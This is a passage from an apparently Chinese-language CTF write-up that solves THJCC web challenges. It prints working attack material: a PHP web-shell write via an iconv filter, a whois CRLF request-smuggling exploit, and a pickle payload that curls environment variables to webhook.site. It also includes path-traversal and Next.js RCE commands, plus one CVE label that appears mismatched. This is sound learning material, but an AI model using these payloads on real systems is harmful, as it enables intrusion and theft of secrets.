class="line">&lt;p&gt;THJCC&#123;f00c263454c4da44_U_kNoW-HOw-t0_uSe-EaR&#125;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>flag：THJCC{f00c263454c4da44_U_kNoW-HOw-t0_uSe-EaR}</p>
</blockquote>
<h2 id="My-First-React"><a href="#My-First-React" class="headerlink" title="My First React"></a>My First React</h2><p>們發現了兩個關鍵的 React 元件：<br>登入介面：<br>在程式碼中可以看到註解字串 <code>* try guest / guest</code>。如果我們在網頁上輸入帳號 <code>guest</code>、密碼 <code>guest</code>，會成功登入並進入下一個畫面，但只會看到一行普通的問候語，拿不到 Flag</p>
<p>繼續往下看，會發現登入後渲染的元件有一段特別的邏輯檢查：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (e === <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> e = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Date</span>.<span class="title function_">now</span>() / <span class="number">1e4</span>);</span><br><span class="line">    <span class="keyword">const</span> n = <span class="keyword">await</span> <span class="keyword">async</span> <span class="keyword">function</span>(<span class="params">e</span>)&#123;</span><br><span class="line">        <span class="comment">// ... (省略) ...</span></span><br><span class="line">        r = <span class="keyword">await</span> crypto.<span class="property">subtle</span>.<span class="title function_">digest</span>(<span class="string">&quot;SHA-1&quot;</span>, n);</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Array</span>.<span class="title function_">from</span>(<span class="keyword">new</span> <span class="title class_">Uint8Array</span>(r)).<span class="title function_">map</span>(<span class="function"><span class="params">e</span>=&gt;</span>e.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">2</span>,<span class="string">&quot;0&quot;</span>)).<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    &#125;(<span class="string">&quot;&quot;</span>+e);</span><br><span class="line">    <span class="keyword">const</span> r = <span class="keyword">await</span> <span class="title function_">fetch</span>(n);</span><br><span class="line">    <span class="keyword">const</span> a = (<span class="keyword">await</span> r.<span class="title function_">json</span>()).<span class="property">result</span>;</span><br><span class="line">    <span class="title function_">o</span>(a); <span class="comment">// 將結果顯示在畫面上</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>取得當前的時間戳ms除以10000並無條件捨去<br>將這個數字字串進行 SHA-1 雜湊計算<br>將計算出來的 Hash 字母直接當作 URL 路徑（例如 &#x2F;<hash>）發起 fetch 請求<br>伺服器驗證該 Hash 若符合當下時間就會回傳包含 Flag 的 JSON 資料</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">(async function() &#123;</span><br><span class="line">    let e = Math.floor(Date.now() / 1e4);</span><br><span class="line">    const n = await async function(e)&#123;</span><br><span class="line">        const n = (new TextEncoder).encode(e),</span><br><span class="line">        r = await crypto.subtle.digest(&quot;SHA-1&quot;, n);</span><br><span class="line">        return Array.from(new Uint8Array(r)).map(e=&gt;e.toString(16).padStart(2,&quot;0&quot;)).join(&quot;&quot;)</span><br><span class="line">    &#125;(&quot;&quot;+e);</span><br><span class="line">    </span><br><span class="line">    console.log(&quot;嘗試獲取 URL: /&quot; + n);</span><br><span class="line">    let r = await fetch(n);</span><br><span class="line">    </span><br><span class="line">    if (r.ok) &#123;</span><br><span class="line">        const data = await r.json();</span><br><span class="line">        console.log(&quot;Flag 是：&quot;, data.result || data);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        console.error(&quot;狀態碼：&quot;, r.status);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
<blockquote>
<p>flag：THJCC{CSR_c4n_b3_d4ng3rrr0us!}</p>
</blockquote>
<h2 id="A-long-time-ago…"><a href="#A-long-time-ago…" class="headerlink" title="A long time ago…"></a>A long time ago…</h2><p>題的核心是利用 PHP 老版本的 Type Juggling（弱型別比較） 漏洞<br>    <img src="https://hackmd.io/_uploads/B1brkMFu-g.png" alt="image"><br>輸入0即可得flag<br>    <img src="https://hackmd.io/_uploads/SkxdJfYuWe.png" alt="image"></p>
<blockquote>
<p>flag：THJCC{Meow_M3ow_Me0w}</p>
</blockquote>
<h2 id="Secret-File-Viewer"><a href="#Secret-File-Viewer" class="headerlink" title="Secret File Viewer"></a>Secret File Viewer</h2><p><img src="https://hackmd.io/_uploads/SJZ3nfFdWg.png" alt="image"><br>點擊後會下載<code>A.txt</code>、<code>B.txt</code>、<code>C.txt</code><br>檔案C有重要提示<br><img src="https://hackmd.io/_uploads/SyS7pftuWe.png" alt="image"><br>按鈕的功能是對<code>download.php?file=</code>做請求<br><img src="https://hackmd.io/_uploads/rkL4azKubl.png" alt="image"><br>改為<code>download.php?file=/flag.txt</code></p>
<blockquote>
<p>flag：THJCC{h0w_dID_y0u_br34k_q’5_pr073c710n???}</p>
</blockquote>
<h2 id="No-Way-Out"><a href="#No-Way-Out" class="headerlink" title="No Way Out"></a>No Way Out</h2><p>本題須繞過<code>exit()</code>且在檔案被背景腳本刪除的 0.67 秒內利用未被封鎖的 <code>iconv</code> 濾鏡破壞 <code>exit()</code> 語法結構，完成<strong>Web Shell</strong>的寫入與執行。</p>
<p>原始碼 (index.php)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$content</span>)) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$exit</span> = <span class="string">&#x27;&lt;?php exit(); ?&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27;base64&#x27;</span>, <span class="string">&#x27;rot13&#x27;</span>, <span class="string">&#x27;string.strip_tags&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$b</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$file</span>, <span class="variable">$b</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;Hacker!!!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$exit</span> . <span class="variable">$content</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="title function_ invoke__">usleep</span>(<span class="number">50000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;file written: &#x27;</span> . <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>繞過黑名單b等常見濾鏡被擋<br>    改用 <code>php://filter/convert.iconv.UCS-2LE.UCS-2BE</code><br>將目標後門 <code>&lt;?php system($_GET[1]); ?&gt;</code> 預先手動對調為 <code>?&lt;hp pystsme$(G_TE1[)] ;&gt;?</code><br>寫入時經過伺服器濾鏡再次對調，完美還原為有效程式碼<br>利用<code>while</code>迴圈，在檔案被刪除的 0.67 秒極短空檔內，不斷發動寫入與讀取請求來進行碰撞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">while true; do</span><br><span class="line">  curl -s -X POST &#x27;http://chal.thjcc.org:8080/index.php?file=php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php&#x27; \</span><br><span class="line">  --data &#x27;content=?&lt;hp pystsme$(G_TE1[)] ;&gt;?&#x27; &gt; /dev/null</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
<p>另一視窗</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">while true; do</span><br><span class="line">  curl -s &#x27;http://chal.thjcc.org:8080/shell.php?1=cat%20/flag.txt&#x27; | grep -o &#x27;THJCC&#123;.*&#125;&#x27; &amp;&amp; break</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
<h2 id="who-is-whois"><a href="#who-is-whois" class="headerlink" title="who is whois"></a>who is whois</h2><p>分析原始碼還原被 Base64 與 XOR 混淆的 TOTP Secret，計算出動態密碼<br>利用 shlex.split() 的特性，傳遞 -h (指定 Host) 與 -p (指定 Port) 參數給系統的 whois 指令<br>藉由 whois 指令發送純文字的特性，精心構造包含 \r\n 的字串，偽造出一個標準的 HTTP POST 請求，藉此繞過 &#x2F;flag 路由的 127.0.0.1 來源限制</p>
<p>exploit:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Python</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pyotp</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">TARGET_URL = <span class="string">&quot;http://chal.thjcc.org:13316/whois&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 解密 Secret 並獲取當前 TOTP</span></span><br><span class="line">raw = base64.b64decode(<span class="string">&quot;Jl5cLlcsI10sKCYhLS40IykpMyQnIF8wIjEtPTM6OzI=&quot;</span>)</span><br><span class="line">secret = <span class="string">&quot;&quot;</span>.join(<span class="built_in">chr</span>(b ^ <span class="built_in">ord</span>(<span class="string">&quot;thjcc&quot;</span>[i % <span class="number">5</span>])) <span class="keyword">for</span> i, b <span class="keyword">in</span> <span class="built_in">enumerate</span>(raw))</span><br><span class="line">current_code = pyotp.TOTP(secret).now()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 構造要走私的 HTTP POST Payload</span></span><br><span class="line"><span class="comment"># 利用 whois -h 127.0.0.1 -p 13316 將以下字串打向本地的 /flag</span></span><br><span class="line">payload = (</span><br><span class="line">    <span class="string">f&#x27;-h 127.0.0.1 -p 13316 &quot;POST /flag HTTP/1.1\r\n&#x27;</span></span><br><span class="line">    <span class="string">f&#x27;Host: 127.0.0.1\r\n&#x27;</span></span><br><span class="line">    <span class="string">f&#x27;admin: thjcc\r\n&#x27;</span></span><br><span class="line">    <span class="string">f&#x27;Content-Type: application/x-www-form-urlencoded\r\n&#x27;</span></span><br><span class="line">    <span class="string">f&#x27;Content-Length: 14\r\n\r\n&#x27;</span></span><br><span class="line">    <span class="string">f&#x27;safekey=<span class="subst">&#123;current_code&#125;</span>&quot;&#x27;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 發送攻擊請求</span></span><br><span class="line">r = requests.post(TARGET_URL, data=&#123;<span class="string">&quot;domain&quot;</span>: payload&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text) <span class="comment"># 在回傳的 HTML 中即可找到 THJCC&#123;...&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="0422"><a href="#0422" class="headerlink" title="0422"></a>0422</h2><p>正常登入後發現<code>cookie</code><br><img src="https://hackmd.io/_uploads/SJ2l0EKu-e.png" alt="image"><br>將<code>role</code>改為<code>admin</code></p>
<blockquote>
<p>flag：THJCC{c00k135_4r3_n07_53cur3_1f_n07_51gn3d_4nd_p13453_d0_7h3_53cur3_c0d1ng_r3v13w_101111}</p>
</blockquote>
<h2 id="msgboard"><a href="#msgboard" class="headerlink" title="msgboard"></a>msgboard</h2><p>根據原始檔<code>flag</code>藏在環境變數裡<br>發現 <code>/api/v1/send_email_code</code> 的回應裡<strong>直接把驗證碼明文回傳</strong>，不用真的收信就能拿到驗證碼，直接註冊帳號。<br>看源碼發現 <code>upload_image</code> 有兩個 bug 疊在一起<br><code>secure_filename(filename)</code> 有呼叫，但<strong>回傳值被丟掉</strong>，完全沒效果<br>副檔名黑名單的 config key 寫 <code>DISALLOWED_EXTENSION</code>，但讀取時用 <code>DISALLOWED_EXTENSIONS</code>（多一個 S），永遠讀到 <code>None</code>，<strong>黑名單完全失效</strong></p>
<p>結果就是可以上傳任意副檔名、任意內容的檔案<br>存檔時用的是</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file.save(os.path.join(UPLOAD_FOLDER, filename))</span><br></pre></td></tr></table></figure>
<p>Python 的 <code>os.path.join</code> 遇到<strong>絕對路徑會直接覆蓋前面的路徑</strong>，所以把 filename 設成 <code>/python-docker/spam_classifier.joblib</code> 就能把檔案寫到任意位置。<br>源碼裡的 <code>check_for_spam()</code> 每次發留言都會執行：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">model = joblib.load(<span class="string">&quot;spam_classifier.joblib&quot;</span>)  <span class="comment"># 每次都重新 load！</span></span><br></pre></td></tr></table></figure>
<p><code>joblib.load</code>本質上是 pickle，<strong>pickle 反序列化時可以執行任意程式碼</strong>。只要覆蓋這個檔案，下一次有人發留言就會觸發 RCE</p>
<p>製作exploit：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Exploit</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        cmd = <span class="string">&quot;curl &#x27;https://webhook.site/...?x=&#x27;\&quot;$(env | base64)\&quot;&#x27;&#x27;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (cmd,))</span><br><span class="line"></span><br><span class="line">payload = pickle.dumps(Exploit())</span><br></pre></td></tr></table></figure>
<p>上傳覆蓋<code>spam_classifier.joblib</code>，然後自己發一篇留言觸發，環境變數就被 curl 出來了<br>Webhook 收到 <code>base64</code></p>
<blockquote>
<p>flag:THJCC{model2rce456ytrrghdrydhrth}</p>
</blockquote>
<h2 id="noaiiiiiiiiiiiiiii"><a href="#noaiiiiiiiiiiiiiii" class="headerlink" title="noaiiiiiiiiiiiiiii"></a>noaiiiiiiiiiiiiiii</h2><p>在<code>robots.txt</code>中看到隱藏路徑<br><img src="https://hackmd.io/_uploads/rJ8dKit_Zg.png" alt="image"><br>給予的是該題目的原始檔</p>
<p><img src="https://hackmd.io/_uploads/S1y5YoFOWg.png" alt="image"></p>
<p>下載後發現這是這個是這個 <strong>CVE-2017-14849</strong> 漏洞<br><code>Node.js 8.5.0</code> 對目錄進行 <code>normalize</code> 操作時，出現了邏輯錯誤。<br>當我們在向上層跳躍的路徑中，如果刻意在中間位置增加一個無意義的目錄切換，就會觸發這個 Bug<br>給予的原始檔描述了<code>/flag_F7aQ9L2mX8RkC4ZP</code><br>也就是<code>flag</code>可能會出現在根節點</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --path-as-is http://chal.thjcc.org:3001/static/../../../a/../../../../flag_F7aQ9L2mX8RkC4ZP</span><br></pre></td></tr></table></figure>
<p>不能直接把這段 URL 貼到瀏覽器的網址列<br>因為所有現代瀏覽器在送出請求前，都會在本地端先自動把 <code>../</code> 解析並抵銷掉</p>
<blockquote>
<p>flag：THJCC{y0u_mu57_b3_4_r34l_hum4n_b3c4u53_0nly_4_hum4n_c4n_r34d_4nd_und3r574nd_7h15_fl46_c0rr3c7ly}</p>
</blockquote>
<h2 id="r2s"><a href="#r2s" class="headerlink" title="r2s"></a>r2s</h2><p>作者又提到「懶得更新伺服器」，這通常暗示該伺服器正運行著一個有知名漏洞的舊版本<br>    <img src="https://hackmd.io/_uploads/HkC0W3Yu-e.png" alt="image"></p>
<p>注意到其Next.js版本為15.0.0<br>這給人的感覺就很刻意<br>查詢後發現有一通稱為<code>React2Shell</code>的漏洞(CVE-2025-29927)<br>在15.0.0&lt;&#x3D;Next.js版本&lt; 15.2.3<br>使用github上名為<a target="_blank" rel="noopener" href="https://github.com/ynsmroztas/NextRce?tab=readme-ov-file">NextRce</a>的漏洞利用腳本<br><del>方便</del></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python3 NextRCSWaff.py -u http://chal.thjcc.org:10458/ -c &quot;ls -al /&quot; --bypass</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/ryRBm3KuZx.png" alt="螢幕擷取畫面 2026-02-23 183802"></p>
<blockquote>
<p>flag：THJCC{r34ct_ssr_rc3_1s_d4ng3r0us}</p>
</blockquote>
<h1 id="AI"><a href="#AI" class="headerlink" title="AI"></a>AI</h1><p>我先說<br><del>我覺得這是裡面極度通靈的題目</del></p>
<h2 id="Deep-Inverse"><a href="#Deep-Inverse" class="headerlink" title="Deep Inverse"></a>Deep Inverse</h2><p>為了解決這個問題，需要反轉 <code>model.pt</code> 中的神經網路模型<br>找到一個 10 維輸入向量 <code>x</code> ，使得模型的輸出 <code>f(x)</code> 約為 <code>1337.0</code><br>這通常是透過將其視為最佳化問題來實現的<br>使用輸入 x 上的梯度下降法來最小化模型預測值與目標值之間的損失</p>
<p>pwn模組的功能也可以加進去<del>我懶</del></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.optim <span class="keyword">as</span> optim</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==================== 本地優化部分 ====================</span></span><br><span class="line"><span class="comment"># 載入 TorchScript 模型</span></span><br><span class="line">model = torch.jit.load(<span class="string">&#x27;model.pt&#x27;</span>, map_location=<span class="string">&#x27;cpu&#x27;</span>)</span><br><span class="line">model.<span class="built_in">eval</span>()</span><br><span class="line"></span><br><span class="line">target = <span class="number">1337.0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">optimize_x</span>(<span class="params">start_scale=<span class="number">1.0</span>, use_lbfgs=<span class="literal">True</span>, max_iters=<span class="number">30000</span>, loss_type=<span class="string">&#x27;L2&#x27;</span></span>):</span><br><span class="line">    <span class="comment"># 正確初始化：保持 leaf Tensor</span></span><br><span class="line">    x = torch.randn(<span class="number">1</span>, <span class="number">10</span>, requires_grad=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> start_scale != <span class="number">1.0</span>:</span><br><span class="line">        x.data.mul_(start_scale)               <span class="comment"># inplace scale，保留 leaf 屬性</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> use_lbfgs:</span><br><span class="line">        optimizer = optim.LBFGS(</span><br><span class="line">            [x],</span><br><span class="line">            lr=<span class="number">0.8</span>,</span><br><span class="line">            max_iter=<span class="number">50</span>,</span><br><span class="line">            history_size=<span class="number">200</span>,</span><br><span class="line">            line_search_fn=<span class="string">&#x27;strong_wolfe&#x27;</span></span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        optimizer = optim.Adam([x], lr=<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">    best_loss = <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)</span><br><span class="line">    best_output = <span class="literal">None</span></span><br><span class="line">    best_x = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;開始優化 (scale=<span class="subst">&#123;start_scale&#125;</span>, optimizer=<span class="subst">&#123;<span class="string">&#x27;LBFGS&#x27;</span> <span class="keyword">if</span> use_lbfgs <span class="keyword">else</span> <span class="string">&#x27;Adam&#x27;</span>&#125;</span>, loss=<span class="subst">&#123;loss_type&#125;</span>)...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(max_iters):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">closure</span>():</span><br><span class="line">            optimizer.zero_grad()</span><br><span class="line">            out = model(x).squeeze()</span><br><span class="line">            <span class="keyword">if</span> loss_type == <span class="string">&#x27;L2&#x27;</span>:</span><br><span class="line">                loss = (out - target) ** <span class="number">2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                loss = torch.<span class="built_in">abs</span>(out - target)</span><br><span class="line">            loss.backward()</span><br><span class="line">            <span class="keyword">return</span> loss</span><br><span class="line"></span><br><span class="line">        current_loss = closure().item()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> current_loss &lt; best_loss:</span><br><span class="line">            best_loss = current_loss</span><br><span class="line">            best_output = model(x).squeeze().item()</span><br><span class="line">            best_x = x.detach().clone()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[改善] iter <span class="subst">&#123;i:5d&#125;</span> | loss <span class="subst">&#123;best_loss:<span class="number">12.6</span>f&#125;</span> | output <span class="subst">&#123;best_output:<span class="number">12.6</span>f&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        optimizer.step(closure)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2000</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;iter <span class="subst">&#123;i:5d&#125;</span> | loss <span class="subst">&#123;current_loss:<span class="number">12.6</span>f&#125;</span> | output <span class="subst">&#123;model(x).squeeze().item():<span class="number">12.6</span>f&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> current_loss &lt; <span class="number">1e-5</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;已收斂!&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> best_x, best_loss, best_output</span><br><span class="line"><span class="comment"># 試多種設定找出最佳</span></span><br><span class="line">configs = [</span><br><span class="line">    &#123;<span class="string">&#x27;start_scale&#x27;</span>: <span class="number">1.0</span>, <span class="string">&#x27;use_lbfgs&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;loss_type&#x27;</span>: <span class="string">&#x27;L2&#x27;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;start_scale&#x27;</span>: <span class="number">10.0</span>, <span class="string">&#x27;use_lbfgs&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;loss_type&#x27;</span>: <span class="string">&#x27;L2&#x27;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;start_scale&#x27;</span>: <span class="number">50.0</span>, <span class="string">&#x27;use_lbfgs&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;loss_type&#x27;</span>: <span class="string">&#x27;L2&#x27;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;start_scale&#x27;</span>: <span class="number">100.0</span>, <span class="string">&#x27;use_lbfgs&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;loss_type&#x27;</span>: <span class="string">&#x27;L2&#x27;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;start_scale&#x27;</span>: <span class="number">10.0</span>, <span class="string">&#x27;use_lbfgs&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;loss_type&#x27;</span>: <span class="string">&#x27;L1&#x27;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;start_scale&#x27;</span>: <span class="number">50.0</span>, <span class="string">&#x27;use_lbfgs&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;loss_type&#x27;</span>: <span class="string">&#x27;L1&#x27;</span>&#125;,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">best_overall_loss = <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)</span><br><span class="line">best_overall_x = <span class="literal">None</span></span><br><span class="line">best_overall_output = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> config <span class="keyword">in</span> configs:</span><br><span class="line">    curr_x, curr_loss, curr_output = optimize_x(**config)</span><br><span class="line">    <span class="keyword">if</span> curr_loss &lt; best_overall_loss:</span><br><span class="line">        best_overall_loss = curr_loss</span><br><span class="line">        best_overall_x = curr_x</span><br><span class="line">        best_overall_output = curr_output</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;此設定結束: loss <span class="subst">&#123;curr_loss:<span class="number">.10</span>f&#125;</span>, output <span class="subst">&#123;curr_output:<span class="number">.6</span>f&#125;</span>\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> best_overall_x <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span 